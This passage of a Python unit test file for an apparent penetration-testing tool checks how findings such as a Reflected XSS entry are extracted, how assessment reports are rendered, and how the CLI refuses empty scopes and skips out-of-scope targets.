        self.assertTrue(f.verified)
        self.assertEqual(f.cwe, "CWE-79")
        self.assertGreater(f.cvss_score, 0.0)
        self.assertEqual(f.parameter, "search")

    def test_unverified_finding_not_gated_as_verified(self):
        from hacking_agent.agents.reporter import extract_findings
        mem, ev = self._memory_with_finding(verified=False)
        findings = extract_findings(mem, ev)
        self.assertEqual(len(findings), 1)
        self.assertFalse(findings[0].verified)

    def test_report_contains_required_sections(self):
        from hacking_agent.agents.reporter import (
            extract_findings,
            render_assessment_report,
        )
        mem, ev = self._memory_with_finding(verified=True)
        findings = extract_findings(mem, ev)
        meta = {
            "engagement_name": "Acme",
            "client": "Acme Corp",
            "tester": "Reynard",
            "targets": ["https://example.com"],
            "authorized_domains": ["example.com"],
            "out_of_scope": ["payments.example.com"],
        }
        md = render_assessment_report(meta, findings, "recon notes")
        for section in (
            "Executive Summary", "Scope", "Methodology",
            "Verified Vulnerabilities", "Remediation", "Reproduction steps",
            "CVSS v3.1", "CWE-79", "Acme Corp",
        ):
            self.assertIn(section, md, section)


class AssessCliTests(unittest.TestCase):
    def test_refuses_empty_scope(self):
        from hacking_agent.cli import assess
        with self.assertRaises(EngagementError):
            assess.authorized_targets(Engagement())

    def test_derives_https_targets_from_domains(self):
        from hacking_agent.cli import assess
        eng = Engagement(authorized_domains=["example.com", "b.example.net"])
        self.assertEqual(
            assess.authorized_targets(eng),
            ["https://example.com/", "https://b.example.net/"],
        )

    def test_explicit_target_out_of_scope_skipped(self):
        from hacking_agent.cli import assess
        eng = Engagement(
            authorized_domains=["example.com"],
            out_of_scope=["payments.example.com"],
        )
        targets = assess.authorized_targets(
            eng,
            explicit=["https://app.example.com/", "https://payments.example.com/"],
        )
        self.assertEqual(targets, ["https://app.example.com/"])

    def test_build_consolidated_report_offline(self):
        from hacking_agent.cli import assess
        from hacking_agent.agents.reporter import Finding
        eng = Engagement(
            engagement_name="Acme",
            authorized_domains=["example.com"],
        )
        finding = Finding(
            title="Reflected XSS",
            vuln_type="Reflected XSS",
            severity="high",
            endpoint="https://example.com/search",
            verified=True,
        )
        finding.ensure_scored()
        rows = [{
            "target": "https://example.com/",
            "verdict": "assessed",
            "wall_clock_seconds": 1.0,
            "findings": [finding],
        }]
        md, js = assess.build_consolidated_report(
            eng, ["https://example.com/"], rows
        )
        self.assertIn("Executive Summary", md)
        self.assertEqual(js["finding_count"], 1)
        self.assertEqual(js["verified_count"], 1)


if __name__ == "__main__":
    unittest.main()
